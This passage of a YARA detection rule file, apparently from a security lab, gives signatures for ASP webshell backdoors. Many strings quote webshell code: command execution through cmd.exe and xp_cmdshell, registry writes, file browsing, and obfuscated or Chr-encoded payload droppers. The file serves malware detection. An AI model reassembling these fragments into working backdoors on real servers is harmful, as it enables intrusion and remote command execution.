        $s19 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
        $s20 = "<td bgcolor=\"#000000\" valign=\"bottom\"><font face=\"Arial\" size=\"-2\" color=gray>NOTE FOR UPLOAD -" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f2032d2b93e8628f2e8457782a8606682450afed
{
     meta:
        description = "asp - file f2032d2b93e8628f2e8457782a8606682450afed.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4b6775baea15cf04adf3ed9991135ba47c48a5bf2ae7f9dabfbf7755f24d1adb"
     strings:
        $s1 = "Response.Write(\"<br>( ) <a href=?type=1&file=\" & server.URLencode(item.path) & \"\\>\" & item.Name & \"</a>\" & vbCrLf)" fullword ascii
        $s2 = "Response.Write(\"<li><a href=?type=2&file=\" & server.URLencode(item.path) & \">\" & item.Name & \"</a> - \" & item.Size & \" by" ascii
        $s3 = "Set oStr = server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s4 = "list.asp = Directory & File View" fullword ascii
        $s5 = "set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s6 = "Response.Write(oFich.ReadAll)" fullword ascii
        $s7 = "<FORM action=\"\" method=\"GET\">" fullword ascii
        $s8 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword ascii
        $s9 = "Response.Write(\"<h3>PATH: \" & file & \"</h3>\")" fullword ascii
        $s10 = "set folder = fs.GetFolder(path)" fullword ascii
        $s11 = "Response.Write(\"<br>( ) <a href=?type=1&file=\" & server.URLencode(path) & \"..\\>\" & \"..\" & \"</a>\" & vbCrLf)" fullword ascii
        $s12 = "file=\"c:\\\"" fullword ascii
        $s13 = "Response.Write(\"<br>--</pre>\")" fullword ascii
        $s14 = "Response.Write(\"<li><a href=?type=2&file=\" & server.URLencode(item.path) & \">\" & item.Name & \"</a> - \" & item.Size & \" by" ascii
        $s15 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_1cc78d13bf07f047b82f2cca0f65229318a0913c
{
     meta:
        description = "asp - file 1cc78d13bf07f047b82f2cca0f65229318a0913c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bd86d29f51116c5ac28188d680fc5b2b70d72ed97dd5567d8d0bf2a17b888dbe"
     strings:
        $x1 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword ascii
        $x2 = "Call oS.Run(\"win.com cmd.exe /c cacls.exe \" & szTF & \" /E /G" fullword ascii
        $x3 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword ascii
        $s4 = "szTF = \"c:\\windows\\pchealth\\ERRORREP\\QHEADLES\\\" &  oFSys.GetTempName()" fullword ascii
        $s5 = "' brett.moore_at_security-assessment.com " fullword ascii
        $s6 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
        $s7 = "' ASP Cmd Shell On IIS 5.1" fullword ascii
        $s8 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
        $s9 = "' http://seclists.org/bugtraq/2006/Dec/0226.html" fullword ascii
        $s10 = "Machine: <%=oSNet.ComputerName%><BR>" fullword ascii
        $s11 = "Response.Write Server.HTMLEncode(oF.ReadAll)" fullword ascii
        $s12 = "' Here we do the command" fullword ascii
        $s13 = "Set oFSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s14 = "Set oS = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
        $s15 = "<input type=text name=\"C\" size=70 value=\"<%= szCMD %>\">" fullword ascii
        $s16 = "Set oSNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
        $s17 = "<input type=submit value=\"Run\"></FORM><PRE>" fullword ascii
        $s18 = "Username: <%=oSNet.UserName%><br>" fullword ascii
        $s19 = "Dim oS,oSNet,oFSys, oF,szCMD, szTF" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9483fbd5f8993ccecd729f26e39e2af34d55c740
{
     meta:
        description = "asp - file 9483fbd5f8993ccecd729f26e39e2af34d55c740.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "91bb468add2687a86069b70f8fd419f5cb290b63c9d99da967243468f0a3dceb"
     strings:
        $x1 = "m'>KingDefacer</a> - <a href='HTTP://WWW.alturks.com' target='_blank'>HTTP://WWW.alturks.com</a> ::.</font>\"" fullword ascii
        $x2 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
        $s3 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDefacer &copy; BY <a href='mailto:kingdefacer@msn.c" ascii
        $s4 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
        $s5 = "o do Command: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
        $s6 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
        $s7 = "Response.Write \"<b>Arquitetura do Processador: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
        $s8 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_BINARY\")" fullword ascii
        $s9 = "Response.Write \"<b>Identificador do Processador: </b>\" & WshEnv(\"PROCESSOR_IDENTIFIER\") & \"<br>\"" fullword ascii
        $s10 = "Response.Write \"<b>System Drive: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"<br>\"" fullword ascii
        $s11 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\"></td></tr>\"" fullword ascii
        $s12 = "szTempFile = \"c:\\\" & oFileSys.GetTempName( ) " fullword ascii
        $s13 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\">\"" fullword ascii
        $s14 = "tion=upload&processupload=yes&path=\" & Request.QueryString(\"path\") & \"\"\">\"" fullword ascii
        $s15 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_DWORD\")" fullword ascii
        $s16 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & strFile" fullword ascii
        $s17 = "Response.Write \"<b>Nome do Computador: </b>\" & WshNetwork.ComputerName & \"<br>\"" fullword ascii
        $s18 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_EXPAND_SZ\")" fullword ascii
        $s19 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_SZ\")" fullword ascii
        $s20 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_MULTI_SZ\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_86a23719e51edc09f7d68388226dd3319ee7a916
{
     meta:
        description = "asp - file 86a23719e51edc09f7d68388226dd3319ee7a916.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "640ef6949c07edc04c8ce29ffb49efc70efc75fd6304c1a9203134ba3b51d0a9"
     strings:
        $x1 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x2 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x3 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\" Then:password= trim(Request.form(\"P\")):id=trim(Requ" ascii
        $x4 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x5 = "'jb\"<tr><td height='22'><a href='http://aspmuma.cn/pr/?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' target='FileFrame'>" fullword ascii
        $x6 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s7 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s8 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s9 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s10 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s11 = "'jb\"<tr><td height='22'><a href='http://aspmuma.cn/mmgx/index.htm' target='FileFrame'>" fullword ascii
        $s12 = "'jb\"<tr><td height='22'><a href='http://aspmuma.cn/ip/?action=sed&cx_33=\"&ServerU&\"' target='FileFrame'>" fullword ascii
        $s13 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s14 = "\"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF" ascii
        $s15 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s16 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s17 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s18 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
        $s19 = "jb\"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s20 = "CONN.ExecUtE(sqlSTR)" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a42709f54f03898392759dd7dcb6da661a56dbf7
{
     meta:
        description = "asp - file a42709f54f03898392759dd7dcb6da661a56dbf7.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "07ad1137324fbb1cb6c5c3f1de901fe585baa7cf0f46dda6c674b313e155511d"
     strings:
        $x1 = "http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script" fullword ascii
        $s2 = "Set objCmdExec = objshell.exec(thecommand)" fullword ascii
        $s3 = "https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp" fullword ascii
        $s4 = "getCommandOutput = objCmdExec.StdOut.ReadAll" fullword ascii
        $s5 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s6 = "Dim objShell, objCmdExec" fullword ascii
        $s7 = "thisDir = getCommandOutput(\"cmd /c\" & szCMD)" fullword ascii
        $s8 = "http://www.w3schools.com/asp/" fullword ascii
        $s9 = "<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">" fullword ascii
        $s10 = "Function getCommandOutput(theCommand)" fullword ascii
        $s11 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
        $s12 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s13 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
        $s14 = "<%Response.Write(Request.ServerVariables(\"server_port\"))%>" fullword ascii
        $s15 = "<FORM action=\"\" method=\"GET\">" fullword ascii
        $s16 = "<%Response.Write(Request.ServerVariables(\"server_software\"))%>" fullword ascii
        $s17 = "<% szCMD = request(\"cmd\")" fullword ascii
        $s18 = "<%Response.Write(Request.ServerVariables(\"server_name\"))%>" fullword ascii
        $s19 = "<input type=\"submit\" value=\"Run\">" fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 3KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b1d94fe24abbf7def6371b1ce6106564c22b3f16
{
     meta:
        description = "asp - file b1d94fe24abbf7def6371b1ce6106564c22b3f16.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "cde8c7715c358f2106ff20e6253139bf40f526746fa267b3d733c6210afa3a8e"
     strings:
        $s1 = "NnQHjTqjf = McNYYAXmk & \"\\\" & rmfarNGHQ.GetTempName()" fullword ascii
        $s2 = "YjeMJFPGjYBtI = NnQHjTqjf & \"\\\" & \"svchost.exe\"" fullword ascii
        $s3 = "64)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)" fullword ascii
        $s4 = ")&Chr(76)&Chr(51)&Chr(50)&Chr(46)&Chr(100)&Chr(108)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)" fullword ascii
        $s5 = "fGPFOeriqq.run YjeMJFPGjYBtI, 0, false" fullword ascii
        $s6 = "(180)&Chr(171)&Chr(13)&Chr(177)&Chr(129)&Chr(175)&Chr(185)&Chr(201)&Chr(85)&Chr(164)&Chr(254)&Chr(2)&Chr(186)" fullword ascii
        $s7 = "(174)&Chr(148)&Chr(33)&Chr(211)&Chr(255)&Chr(48)&Chr(178)&Chr(212)&Chr(136)&Chr(176)&Chr(14)&Chr(207)&Chr(198)" fullword ascii
        $s8 = "hr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)" fullword ascii
        $s9 = "r(150)&Chr(211)&Chr(168)&Chr(90)&Chr(73)&Chr(203)&Chr(204)&Chr(46)&Chr(26)&Chr(12)&Chr(247)&Chr(26)&Chr(150)" fullword ascii
        $s10 = "&Chr(138)&Chr(235)&Chr(15)&Chr(26)&Chr(84)&Chr(162)&Chr(254)&Chr(109)&Chr(165)&Chr(199)&Chr(153)&Chr(230)" fullword ascii
        $s11 = "0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)" fullword ascii
        $s12 = "hr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(48)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(0)" fullword ascii
        $s13 = "&Chr(77)&Chr(155)&Chr(122)&Chr(104)&Chr(25)&Chr(109)&Chr(212)&Chr(31)&Chr(3)&Chr(174)&Chr(199)&Chr(253)" fullword ascii
        $s14 = "hr(239)&Chr(154)&Chr(151)&Chr(134)&Chr(132)&Chr(92)&Chr(75)&Chr(111)&Chr(27)&Chr(162)&Chr(55)&Chr(170)" fullword ascii
        $s15 = "(18)&Chr(178)&Chr(236)&Chr(110)&Chr(172)&Chr(126)&Chr(217)&Chr(199)&Chr(163)&Chr(135)&Chr(106)&Chr(18)" fullword ascii
        $s16 = "155)&Chr(93)&Chr(181)&Chr(211)&Chr(214)&Chr(42)&Chr(150)&Chr(244)&Chr(192)&Chr(254)&Chr(254)&Chr(102)" fullword ascii
        $s17 = "9)&Chr(3)&Chr(57)&Chr(212)&Chr(251)&Chr(254)&Chr(135)&Chr(24)&Chr(121)&Chr(55)&Chr(220)&Chr(200)" fullword ascii
        $s18 = "1)&Chr(242)&Chr(123)&Chr(121)&Chr(220)&Chr(198)&Chr(7)&Chr(185)&Chr(166)&Chr(64)&Chr(235)&Chr(213)" fullword ascii
        $s19 = "&Chr(63)&Chr(139)&Chr(80)&Chr(27)&Chr(11)&Chr(156)&Chr(150)&Chr(161)&Chr(138)&Chr(17)&Chr(239)&Chr(196)" fullword ascii
        $s20 = "(220)&Chr(232)&Chr(209)&Chr(218)&Chr(225)&Chr(160)&Chr(139)&Chr(254)&Chr(84)&Chr(115)&Chr(0)&Chr(128)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule sig_43328c78e906cddc813382f26f0176a96568cde3
{
     meta:
        description = "asp - file 43328c78e906cddc813382f26f0176a96568cde3.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ac32432ae9ce015add0335d9f1fa08f198193d545f4efccd20965288af14663b"
     strings:
        $s1 = "@!Jl@*@!&Y[@*@!zOD@*E@#@&I]jr@!Y.@*@!Y[P4nbo4D'E !E@*@!CP4Dn0{B%C7l/1.kaY)w;sVwWM:cJEELInnmOtv?ndkkWUcrsGV9nMnCDtr#[r-gnhwWsN" fullword ascii
        $s2 = "N~sKokU;k+.PL~^WLbxal/kPL~:DP'P9+s;k+D,'P$EkD~@#@&idU+OPaK}?P&{UWDtrUT@#@&77M+dwKUk+ SDbY+,J@![k7PCVboUxr[m4.`2cP*'Em" fullword ascii
        $s3 = "RqDkD+,E@!D+aYmDnC,xlsn'EnlD4dB,mKVd'v0ZB~DKA/{BqTEPmsCk/xBA[bYv@*JLnlDtkm/DD'J@!zOnXYlMnl@*J@#@&7]+kwKxd+ " fullword ascii
        $s4 = "DW2W^Nn.9+DvoWSsW^GUPUt!x^Yr]\"?=0#=Up8N~{PU=-mV;+gCs+ KDsRs4k9n0PYGwc8nsk+kDc#pR/!8h+6WM:2R4r9WUiDGszmOr!+Px~" fullword ascii
        $s5 = "S.Knsw?P[,/,=P@*P/:9P'',f+6&m,UPD4'U,+^VKlU~v?4hk I!ZCs^PD;n*=%+1O?Ynsr(V+UXkUocsrDbwOrD`UU^r(L+1.nlD+kPxP/j" fullword ascii
        $s6 = "DcqGP&1PP(9A1Pq:ePvFSq*P16P,1iSdS`?3\"PjbI;Cz]`l!b#rJIjDD$ODP{PJr9]rhP:b$S3~]KC4^n1m:nDrJijOM$q!Yx,JEzS:2I,Kz$SAP,Km4sngl:" fullword ascii
        $s7 = "8dsws?U=aoowVGD{=P(o^G? !==TtO'?[,tnbYM@*@!Dq8'U@!?(F{?@*=#+Vkn=@*@!zD.@*@!JY9zWWUODt'U@!8LcwC2pU[G@*Lx8/21OsoKD{a&DP1GVY@!WW" fullword ascii
        $s8 = "lAw*U=3:slslVGDx==ALmK~K4+U3w2s=x?a3s1G^W.&0,Ao,k6|'8PPt&0~];+x#]/vk#1G[+vKtS3xUWK'uP;GV&#|3^/+|Sl!b#\"dvkbd+6Y`1W9n`:HJ2" fullword ascii
        $s9 = "6Ov,kN{vEEP\\ms;+{BdW^ls)9:rxbdYMlOGMB@*@!&DN@*J@#@&\"Ijr@!JYD@*J@#@&I\"?E@!DD~C^ko" fullword ascii
        $s10 = "'vD+XYB,k9xB6B~\\mV;n{BJLW[rBPkr\"+{BRB@*@!&O9@*E@#@&]IUJ@!&DD@*E@#@&I]?r@!DD~mVbox{B1nxD+.B,\\Csbox{v:bNN^nv@*r@#@&I]?E@!DN@*" fullword ascii
        $s11 = "Uqx?&=[@*@!zYL=@!JY?&xjqM@*?=[@*@!&DwI@!JO@*Lx8d?U ==kwCx{=,mG^swss?U?:swWsWM'=~(om?= ZUkT4O'DN,tn@!O.@*@!jqZxUM@*=~#+x[~b0|6{=" fullword ascii
        $s12 = "Y G6W/1.HbD'9n-kMW?nn`COM+ Z,/##xL4bWY~H,'~Z" fullword ascii
        $s13 = "r4N+1O`rHrmMWdG6YRo\\S_KKhEb@#@&4cW2+U~rM3KrSPrtOOa)z&qyG !cTcFlrPLP0DwaGDDP'PrzLG^N/!Uz!wl9hrxJ/yJSPP.!+SPrE~,JE@#@&4Rdn" fullword ascii
        $s14 = "@!Jl@*@!&Y[@*@!zOD@*E@#@&I]jr@!Y.@*@!Y[P4nbo4D'E FE@*@!CP4Dn0{B_)1YkKU'\"+l9]3MEPDl.onO{Bok^nsMlhnE@*" fullword ascii
        $s15 = "&fPC=~Fa6I~~rI93\"O$r:P}HR;rdrI=P[T!R!T!pP/6drI=~aZ!06TTi,A}I92]R:rKO;6S}Il~[!!0TZ!IPw6gKRwbtqSI),-+MNCxmi~$}IfA]O\"qM_PR" fullword ascii
        $s16 = "/W{0kWRV+Dok^+cJ'- wr[0bs+alY4q'J'JLDUN2nX[ERr'0bVnUm:+qb@#@&Ulsnk0 mYDDk(EDn/,'~&O@#@&WkWR9nV" fullword ascii
        $s17 = "@!ESr[VDIJ*)/D.]2kE^Y~'~]Awsb13`kY.]A/EsOBJ@*JBELoOpJ*)/DD\"3/!VOP{P]3aVb13`kYD\"3dE^YBm4Dcq2#SJ@!8D@*JblAxN~r6)d+D~mNG;W" fullword ascii
        $s18 = "KY4~PA93IUKdj~Z3e,|]5t)I&PKq*!~ec&KHKG3,qUDPbqNm`mO+GksPwVnC(PKDn+mZDv=O+1EX+ 2UU1Wb=anR}lh." fullword ascii
        $s19 = "/nRS.bYn,J@!4D@*@!(.@*@!w@*@!(D@*@!a@*@!(.@*@!4D@*@!2@*@!4M@*@!mnUD+.@*@!8D@*@!8.@*@!0GUDP^W^GM'." fullword ascii
        $s20 = "JrPmKxDnxD'EJD+aOJtYssi,mtm.d+D'T4+&q+rJ@*J@#@&I\"?E@!DkYsn@*J':sUm:nLJ,OPr[UnD7+.qh[ER ?W6OP PJLdnD7+M/G0O'r@!&YbOV" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_0ede1657e8e10e8fe3d35ab036dc5e31a8e571fa
{
     meta:
        description = "asp - file 0ede1657e8e10e8fe3d35ab036dc5e31a8e571fa.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "44a6c760d178e1f06af96f1fbb137e6528911b4964b151884e7b23a6173dddd4"
     strings:
        $s1 = "<%Execute(DeAsc(\"%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59\")):Function DeAsc(Str):Str=Split(" ascii
        $s2 = "<%Execute(DeAsc(\"%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59\")):Function DeAsc(Str):Str=Split(" ascii
        $s3 = "r,\"%\"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_958bcc7e41f806f077a73323d58b558f2917725b
{
     meta:
        description = "asp - file 958bcc7e41f806f077a73323d58b558f2917725b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ac37768b953d2bc5c1704f4225a9b1d0d7cc21cc30814dab1014c886100bc749"
     strings:
        $s1 = "(/*-/*-*/P/*-/*-*/,/*-/*-*/\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"/*-/*-*/);%>" fullword ascii
        $s2 = "\",\"+\"\\\"\"+\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"+\"\\\"\"+\")\";eval" fullword ascii
        $s3 = "\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u\"+\"e\"/*-/*-*/+\"s\"+\"t\"+" fullword ascii
        $s4 = "\"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]\"+" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1bc7327f9d3dbff488e5b0b69a1b39dcb99b3399
{
     meta:
        description = "asp - file 1bc7327f9d3dbff488e5b0b69a1b39dcb99b3399.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "09c6235017dc71052b2761a8611fca3e2652d79f9ce3af98908aa67ad7b33e42"
     strings:
        $s1 = "dYcsG.s`JjnmD^t|WbVnA6DJ#@#@&i7d;lsV,?4GSbV^ok^+ vPhwhlDtb@#@&7i2UN,(0@#@&]]UPJ@!Om4s+,AbNO4'rJFZ!uEJ,4GD9+.xrJ!rEP1+V^2CN9k" fullword ascii
        $s2 = "e]A%PhLp%M0jl[BFMB=)_q'O%++%n|o _*!1y@*@*xx {Gv=I1s{\"m6%tWVSLz/gC6SLz%M0hWimEUE4em6%4xPhLolH%($YAXkYuzkLhS\"CmI9Ip?(mI5n\\BpAq" fullword ascii
        $s3 = "_R =bYsu/DxX4/.FgkYUX4/\"Fuk/N_B;hoz/AozZSo) ++y + y+ y ++y  ++y + y+y +y y  y yv]NXUh'&%akYEX%" fullword ascii
        $s4 = "@!J8@*@!&m@*@!zY9@*@!&YM@*E@#@&I]jr@!YM@*@!DNP4nro4Y{B+!v@*@!l~tMn0{B%C7l/^.bwO)U4KhoKV9+DvJrE[\"+KlDtc]KWYhCY4#[rEE#E@*@!4@*" fullword ascii
        $s5 = "dYv0k^nO6D#,K4+U@#@&d7di]+aW.O,'P]naW.YLE@!Y.@*@!DN@*r[Dn:a[E@!JY[@*@!YN@* ?m\\+@!&ON@*@!DN@*" fullword ascii
        $s6 = "\"qP2~E,P@!qgKj:PH)t2'/\\GPP5h3{K3oK@*J@#@&di7P,P]2Un6HU2Rq]q:2Pr@!j2d2;K~1)\\A'vK}6SEP@*@!}nK(6gP#bdiA'vE@* OO " fullword ascii
        $s7 = "jDD~{PrnDK\\b[+M'\\k1DGdK0YcB+DRrd39Accc!IP9CDl~?K;D1+xE,[PjnM\\nDc\\mwKmY4`J_?_ :94E#@#@&C[KZlDCVKoR;.nlD+,mGxUjDD@#@&1Gx" fullword ascii
        $s8 = "hW$A%Ph%62z6Ny-%S_B/Sn|F|nFv~$SY$Yt^ourXzZrXWb@$;Xo/3/~n||nFF`BASY5Y4sT]rXz/kHc)" fullword ascii
        $s9 = "3BvBR.SYF;$\"|QX;USt6W`6WSA0%S:Y6b;~*R~~z:^x%:ukz)E_1o$1od" fullword ascii
        $s10 = "D /M+lDnr(L+1OcJtk1DG/GWDRpHduK:nEb@#@&4 Ga+UPr!AKEBPrtYDw=&z8 {RZRT 8)J,'P6YwaG.Y,[,J&oGs9/;xJ;wmNhr" fullword ascii
        $s11 = "EvOHE.YSEY$uLD6jqeRBEA%k$YnL`Y]vEA$/DUX4sFR0x]%a$L:@$N.6?(ZBEJJrJrEJrBv]~!Y%.;0PfLM0?nf.hD3NkU:f;DX@$RN.0U|qvE" fullword ascii
        $s12 = "2VmmncwkVnKmY4~knM\\nMRtlwhlD4`r-E#LJwEBJJBq~8~F*'E@!Jl@*@!8D~&@*J@#@&,~P,Ynha'Ynha[E@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[Mn2Vmm" fullword ascii
        $s13 = "aY~E_`1QBS$Ny50PY~!xS$bx]SNDMz8NeBAaX0$t]BX)%XBA%E?XYS!x~~%D6/]H\";/" fullword ascii
        $s14 = "P,PP,P,~P,P~P,I3jhr1U3RqIq:3~J@!z:2pK)]Ab@*J@#@&diP~~,PP~j:I}jA]IPx,JGIrhP:)Ad2~$x1/Dpf2;Jb\"2P@$6~qgK,2p2/~Unmrz/IAbP3,B" fullword ascii
        $s15 = "@!JsrgK@*@!A\"@*E@#@&P~~,PP,~P,PP,~~P,P,P~P~jA?jq}H`rn](r#'q@#@&P~P,~,P~,P,PP,P,~P,P~P,2JjA@#@&,~P,PP,~~P,P,P~P~~,P~P,]2Un6HU2R" fullword ascii
        $s16 = "\"(KABJ@#@&7d,P,P~P~jAK~IA/IA?iJ:P'~)Gr/rgHc2pAZ`K2v?:]p`2]5*P@#@&idP,~P,PP&o~IAZ\"2jjJPv!bP:u2gP@#@&idP~~,P~P\"3Un6g?AR" fullword ascii
        $s17 = "\"q:2BBBoK?:b]RGSJv*J@#@&7d,PP,~~Pzf}Z61H A(3Z`P2v?P]5j2]e*d@#@&,~,P~,P,PP,P,~P,P~P,P~~\"2?h61U2Rq](KAPr@!orHP,Z6S}]'\"29@*" fullword ascii
        $s18 = "Y4M 2tag!Ds'E'9WhlbU[r[dOHV+x+rJ@*@!Jrso@*@!z1+xD+M@*J@#@&]IUJ@!&DN@*@!&YM@*J@#@&(0,r(Kc!Sq*'EPr~K4+U@#@&IIjE@!Y.@*@!O9P4" fullword ascii
        $s19 = "Px~rOfAJ2:2f}\\)qgJ,[~\\8/MSWPL~J qKxZR! Tc!EPL~74/MS6P[,J,KWMYHW{J~',0Ya2WMYPL~-4;Dd0@#@&hO,'~JU(KAP\\)&1K3Hz1/2r~LP-(ZMS0@#@&" fullword ascii
